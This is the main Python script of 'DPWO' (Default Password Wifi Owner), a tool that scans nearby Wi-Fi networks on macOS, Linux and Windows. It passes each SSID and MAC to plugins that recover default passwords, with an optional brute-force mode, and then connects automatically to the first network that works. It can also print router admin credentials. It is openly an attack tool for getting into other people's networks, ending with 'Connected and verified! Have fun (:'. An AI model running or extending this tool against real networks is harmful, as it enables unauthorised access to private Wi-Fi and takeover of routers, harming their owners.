# -*- coding: utf-8 -*-
import argparse
import importlib.machinery
import importlib.util
import os
import subprocess
import sys
import tempfile
import time

from tqdm import tqdm


'''
DPWO
Default Password Wifi Owner 0.5v
python3
'''

AIRPORT_PATH = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport"
MAX_SCAN_RETRIES = 5
SCAN_RETRY_DELAY = 1


def _get_base_path():
    if getattr(sys, 'frozen', False):
        return sys._MEIPASS
    return os.path.dirname(os.path.abspath(__file__))


class NETOwner():
    def __init__(self, iface, connect=False, brute=False,
                 airport=AIRPORT_PATH, verbosity=0, log_callback=None):
        self.iface = iface
        self.brute = brute
        self.connect = connect
        self.airport = airport
        self.verbosity = verbosity
        self.log_callback = log_callback
        self.os = sys.platform
        self.plugins = self.load_plugins()

    def _log(self, msg):
        if self.log_callback:
            self.log_callback(msg)
        else:
            print(msg)

    def load_plugins(self) :
        plugin_folder = os.path.join(_get_base_path(), "plugins")
        plugins = []

        try:
            possible_plugins = os.listdir(plugin_folder)
        except OSError as e:
            self._log(f"Error: Could not load plugins from {plugin_folder}: {e}")
            return plugins

        for f in possible_plugins :
            location = os.path.join(plugin_folder,f)

            if not f.endswith('.py') or not os.path.isfile(location):
                continue

            try:
                spec = importlib.util.spec_from_file_location(f[:-3], location)
                p = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(p)
                plugins.append(p)
            except Exception as e:
                self._log(f"Warning: Failed to load plugin {f}: {e}")

        return plugins

    def osx_networks(self):
        # Try CoreWLAN first (modern macOS), fall back to airport (legacy)
        scan = self._osx_scan_corewlan()
        if scan is None:
            scan = self._osx_scan_airport()
        if scan is None:
            self._log("Error: Could not scan WiFi. Ensure Location Services are enabled.")
            return
        yield from scan

    def _osx_scan_corewlan(self):
        try:
            from CoreWLAN import CWWiFiClient
        except ImportError:
            return None

        try:
            client = CWWiFiClient.sharedWiFiClient()
            iface = client.interface()
            if iface is None:
                return None
            networks, error = iface.scanForNetworksWithName_error_(None, None)
            if error or not networks:
                return None
            results = []
            for net in networks:
                ssid = net.ssid()
                bssid = net.bssid()
                if ssid and bssid:
                    results.append([ssid, bssid])
            return results if results else None
        except Exception:
            return None

    def _osx_scan_airport(self):
        scan = ""
        for attempt in range(MAX_SCAN_RETRIES):
            try:
                scan = subprocess.check_output([self.airport, "scan"]).decode()
            except (subprocess.CalledProcessError, OSError) as e:
                if self.verbosity > 0:
                    tqdm.write(f"Airport scan attempt {attempt + 1} failed: {e}")
            if scan != "":
                break
            if attempt < MAX_SCAN_RETRIES - 1:
                time.sleep(SCAN_RETRY_DELAY)

        if scan == "":
            return None

        scan = scan.encode('ascii', 'ignore')
        scan = scan.decode().split("\n")

        n_spaces = scan[0].split("SSID")[0].count(" ") + 4
        scan.pop(0)

        results = []
        for wifi in scan:
            obj_t = str.split(wifi)
            if len(obj_t) < 1:
                continue
            obj = [wifi[:n_spaces].replace(" ", ''),
                   wifi[n_spaces:].split()[0]]
            if len(obj) > 0:
                results.append(obj)
        return results if results else None

    def linux_networks(self):
        # Try nmcli first, then iwd (D-Bus), then iwlist (needs sudo)
        for scanner in (self._linux_scan_nmcli, self._linux_scan_iwd, self._linux_scan_iwlist):
            scan = scanner()
            if scan is not None:
                yield from scan
                return
        self._log("Error: Could not scan. Install NetworkManager (nmcli) or iwd (iwctl).")

    def _linux_scan_nmcli(self):
        try:
            out = subprocess.check_output(
                [
                    "nmcli", "-t", "-f", "SSID,BSSID",
                    "device", "wifi", "list",
                    "ifname", self.iface,
                    "--rescan", "yes",
                ],
                text=True, timeout=30,
            )
        except (OSError, subprocess.CalledProcessError, subprocess.TimeoutExpired):
            return None

        import re
        results = []
        for line in out.strip().splitlines():
            parts = re.split(r'(?<!\\):', line)
            if len(parts) < 2:
                continue
            ssid = parts[0].replace("\\:", ":").strip()
            bssid = parts[1].replace("\\:", ":").strip()
            if ssid and bssid:
                results.append([ssid, bssid])
        return results

    def _linux_scan_iwd(self):
        import re

        # Find the iwd station object path for our interface
        try:
            tree = subprocess.check_output(
                ["busctl", "tree", "net.connman.iwd"],
                text=True, timeout=10,
            )
        except (OSError, subprocess.CalledProcessError, subprocess.TimeoutExpired):
            return None

        # Find station path by checking Device.Name for each candidate
        station_path = None
        candidate_paths = re.findall(r'(/net/connman/iwd/\d+/\d+)\b', tree)
        # Remove duplicates, keep order
        seen = set()
        candidate_paths = [p for p in candidate_paths if not (p in seen or seen.add(p))]

        for path in candidate_paths:
            try:
                out = subprocess.check_output(
                    [
                        "busctl", "get-property", "net.connman.iwd",
                        path, "net.connman.iwd.Device", "Name",
                    ],
                    text=True, timeout=5,
                )
                if f'"{self.iface}"' in out:
                    station_path = path
                    break
            except (OSError, subprocess.CalledProcessError, subprocess.TimeoutExpired):
                continue

        if not station_path:
            return None

        # Trigger a scan
        try:
            subprocess.run(
                [
                    "busctl", "call", "net.connman.iwd",
                    station_path, "net.connman.iwd.Station", "Scan",
                ],
                capture_output=True, timeout=10,
            )
            time.sleep(3)
        except (OSError, subprocess.TimeoutExpired):
            pass

        # Get ordered networks — returns array of (object_path, signal)
        try:
            out = subprocess.check_output(
                [
                    "busctl", "call", "net.connman.iwd",
                    station_path, "net.connman.iwd.Station",
                    "GetOrderedNetworks",
                ],
                text=True, timeout=10,
            )
        except (OSError, subprocess.CalledProcessError, subprocess.TimeoutExpired):
            return None

        # Parse network paths from the output
        network_paths = re.findall(r'"(/net/connman/iwd/[^"]+)"', out)

        results = []
        for net_path in network_paths:
            # Get SSID from the Network object
            try:
                name_out = subprocess.check_output(
                    [
                        "busctl", "get-property", "net.connman.iwd",
                        net_path, "net.connman.iwd.Network", "Name",
                    ],
                    text=True, timeout=5,
                )
                ssid_match = re.search(r'"(.+)"', name_out)
                if not ssid_match:
                    continue
                ssid = ssid_match.group(1)
            except (OSError, subprocess.CalledProcessError, subprocess.TimeoutExpired):
                continue

            # Find BSS children to get BSSIDs
            bss_paths = re.findall(
                re.escape(net_path) + r'/[0-9a-f]+',
                tree,
            )
            for bss_path in bss_paths:
                try:
                    addr_out = subprocess.check_output(
                        [
                            "busctl", "get-property", "net.connman.iwd",
                            bss_path, "net.connman.iwd.BasicServiceSet",
                            "Address",
                        ],
                        text=True, timeout=5,
                    )
                    addr_match = re.search(r'"([0-9a-fA-F:]{17})"', addr_out)
                    if addr_match:
                        results.append([ssid, addr_match.group(1)])
                except (OSError, subprocess.CalledProcessError, subprocess.TimeoutExpired):
                    continue

        return results if results else None

    def _linux_scan_iwlist(self):
        try:
            out = subprocess.check_output(
                ["iwlist", self.iface, "scan"],
                text=True, timeout=30, stderr=subprocess.DEVNULL,
            )
        except (OSError, subprocess.CalledProcessError, subprocess.TimeoutExpired):
            return None

        import re
        results = []
        current_mac = None
        for line in out.splitlines():
            line = line.strip()
            mac_match = re.search(r'Address:\s*([0-9A-Fa-f:]{17})', line)
            if mac_match:
                current_mac = mac_match.group(1)
            ssid_match = re.search(r'ESSID:"(.+)"', line)
            if ssid_match and current_mac:
                results.append([ssid_match.group(1), current_mac])
                current_mac = None
        return results

    def windows_networks(self):
        try:
            scan = subprocess.check_output(
                ["netsh", "wlan", "show", "networks", "mode=bssid"],
                text=True, timeout=30,
            )
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired, OSError) as e:
            self._log(f"Error scanning WiFi networks: {e}")
            return

        current_ssid = None
        current_mac = None

        for line in scan.splitlines():
            line = line.strip()
            if line.startswith("SSID") and "BSSID" not in line:
                current_ssid = line.split(":", 1)[1].strip()
            elif line.startswith("BSSID"):
                current_mac = line.split(":", 1)[1].strip()
                if current_ssid and current_mac:
                    yield [current_ssid, current_mac]

    def scan_network(self):
        if self.os == "linux" or self.os == "linux2":
            scanner = self.linux_networks()
        elif self.os == "darwin":
            scanner = self.osx_networks()
        elif self.os == "win32":
            scanner = self.windows_networks()
        else:
            self._log(f"Error: Unsupported platform '{self.os}'.")
            return []

        results = []
        for wifi in scanner :

            if self.verbosity > 1:
                tqdm.write(str(wifi))

            # match SSID/MAC to a plugin
            for p in self.plugins : 
                if self.brute and p.__name__ == "brute" :
                    for b in p.own(wifi[0],wifi[1]) :
                        results.append(b)
                elif p.is_vuln(wifi[0],wifi[1]) : 
                    results.append(p.own(wifi[0],wifi[1]))

        return results

    def connect_net(self, wifi):
        try:
            if self.os == "linux" or self.os == "linux2":
                status = self.connect_net_linux(wifi)
            elif self.os == "darwin":
                status = self.connect_net_osx(wifi)
            elif self.os == "win32":
                status = self.connect_net_windows(wifi)
            else:
                self._log(f"Error: Connection not supported on '{self.os}'.")
                return False

            return status
        except (subprocess.TimeoutExpired, subprocess.CalledProcessError, OSError) as e:
            if self.verbosity > 0:
                tqdm.write(f"Connection error: {e}")
            return False

    def connect_net_osx(self, wifi):
        result = subprocess.run(
            [
                "networksetup", "-setairportnetwork",
                self.iface, wifi["ssid"], wifi["wifi_password"],
            ],
            capture_output=True,
            text=True,
            timeout=30,
        )
        if self.verbosity > 0:
            tqdm.write(result.stdout.strip())
        return result.returncode == 0

    def connect_net_linux(self, wifi):
        # Try nmcli first, then iwctl
        result = self._linux_connect_nmcli(wifi)
        if result is not None:
            return result
        result = self._linux_connect_iwctl(wifi)
        if result is not None:
            return result
        self._log("Error: Neither nmcli nor iwctl found. Install NetworkManager or iwd.")
        return False

    def _linux_connect_nmcli(self, wifi):
        try:
            result = subprocess.run(
                [
                    "nmcli", "device", "wifi", "connect",
                    wifi["ssid"],
                    "password", wifi["wifi_password"],
                    "ifname", self.iface,
                ],
                capture_output=True,
                text=True,
                timeout=30,
            )
        except FileNotFoundError:
            return None
        if self.verbosity > 0:
            tqdm.write(result.stdout.strip())
        return result.returncode == 0

    def _linux_connect_iwctl(self, wifi):
        try:
            result = subprocess.run(
                [
                    "iwctl", "station", self.iface,
                    "connect", wifi["ssid"],
                    "--passphrase", wifi["wifi_password"],
                ],
                capture_output=True,
                text=True,
                timeout=30,
            )
        except FileNotFoundError:
            return None
        if self.verbosity > 0:
            tqdm.write(result.stdout.strip())
        return result.returncode == 0

    def connect_net_windows(self, wifi):
        profile_xml = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{wifi["ssid"]}</name>
    <SSIDConfig>
        <SSID>
            <name>{wifi["ssid"]}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{wifi["wifi_password"]}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""

        try:
            with tempfile.NamedTemporaryFile(
                mode="w", suffix=".xml", delete=False
            ) as f:
                f.write(profile_xml)
                profile_path = f.name

            add_result = subprocess.run(
                ["netsh", "wlan", "add", "profile", f"filename={profile_path}"],
                capture_output=True, text=True, timeout=30,
            )
            os.unlink(profile_path)

            if add_result.returncode != 0:
                if self.verbosity > 0:
                    tqdm.write(f"Failed to add profile: {add_result.stderr.strip()}")
                return False

            iface_args = [f"interface={self.iface}"] if self.iface != "Wi-Fi" else []
            connect_result = subprocess.run(
                ["netsh", "wlan", "connect", f"name={wifi['ssid']}"] + iface_args,
                capture_output=True, text=True, timeout=30,
            )
            if self.verbosity > 0:
                tqdm.write(connect_result.stdout.strip())
            return connect_result.returncode == 0
        except (subprocess.TimeoutExpired, OSError) as e:
            if self.verbosity > 0:
                tqdm.write(f"Windows connection error: {e}")
            return False

    def verify_connection(self):
        try:
            if self.os == "win32":
                cmd = ["ping", "-n", "1", "-w", "3000", "8.8.8.8"]
            else:
                cmd = ["ping", "-c", "1", "-W", "3", "8.8.8.8"]
            result = subprocess.run(
                cmd,
                capture_output=True,
                timeout=10,
            )
            return result.returncode == 0
        except (subprocess.TimeoutExpired, OSError) as e:
            if self.verbosity > 0:
                tqdm.write(f"Verification failed: {e}")
            return False

    def scan_network_with_callback(self, on_result=None, on_done=None, on_error=None):
        if self.os == "linux" or self.os == "linux2":
            scanner = self.linux_networks()
        elif self.os == "darwin":
            scanner = self.osx_networks()
        elif self.os == "win32":
            scanner = self.windows_networks()
        else:
            if on_error:
                on_error(f"Unsupported platform '{self.os}'.")
            return

        results = []
        try:
            for wifi in scanner:
                for p in self.plugins:
                    if self.brute and p.__name__ == "brute":
                        for b in p.own(wifi[0], wifi[1]):
                            results.append(b)
                            if on_result:
                                on_result(b)
                    elif p.is_vuln(wifi[0], wifi[1]):
                        r = p.own(wifi[0], wifi[1])
                        results.append(r)
                        if on_result:
                            on_result(r)
        except Exception as e:
            if on_error:
                on_error(str(e))
            return

        if on_done:
            on_done(results)

    def connect_and_verify(self, wifi):
        if not self.connect_net(wifi):
            return "failed"
        if self.verify_connection():
            return "connected"
        return "no_internet"

    def own(self):
        wifi_available = self.scan_network()

        if len(wifi_available) == 0:
            print("No WiFi available :'(")
            return

        connected = False
        for wifi in tqdm(wifi_available):
            tqdm.write("WI-FI: " + wifi["ssid"])
            tqdm.write("Password: " + wifi["wifi_password"])

            if self.verbosity > 0:
                if wifi.get("admin_login") and wifi.get("admin_password"):
                    tqdm.write("Admin credentials of the router: ")
                    tqdm.write("User: " + wifi["admin_login"])
                    tqdm.write("Password: " + wifi["admin_password"])

            if not self.connect:
                continue

            if connected:
                continue

            tqdm.write("Trying to connect...")
            if self.connect_net(wifi):
                if self.verify_connection():
                    tqdm.write("Connected and verified! Have fun (:")
                    if not self.brute:
                        connected = True
                else:
                    tqdm.write("Connected but no internet access, trying next...")
            else:
                tqdm.write("Nope :(")


def parse_args():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )

    default_iface = "Wi-Fi" if sys.platform == "win32" else "wlp3s0"
    parser.add_argument("-i", "--interface", default=default_iface,
                        help="Network interface.")
    parser.add_argument("-b", "--brute",action='store_true', default=False,
                        help="Bruteforce all networks unregarding the SSID.")
    parser.add_argument("-d", "--disable", action="store_false", default=True,
                        help="Disable autoconnect to the first vulnerable network.")
    parser.add_argument("-a", "--airport", default=AIRPORT_PATH,
                        help="Airport program path.")
    parser.add_argument("-v", "--verbosity", action="count",
                        help="Increase output verbosity.")
    args = parser.parse_args()

    return args


def main():
    print("DPWO      v0.5")
    print("≈≈≈≈≈≈≈≈≈≈≈≈≈≈")

    args = parse_args()

    owner = NETOwner(
        args.interface,
        connect=args.disable,
        brute=args.brute,
        airport=args.airport,
        verbosity=args.verbosity or 0
    )

    owner.own()


if __name__ == "__main__":
    main()
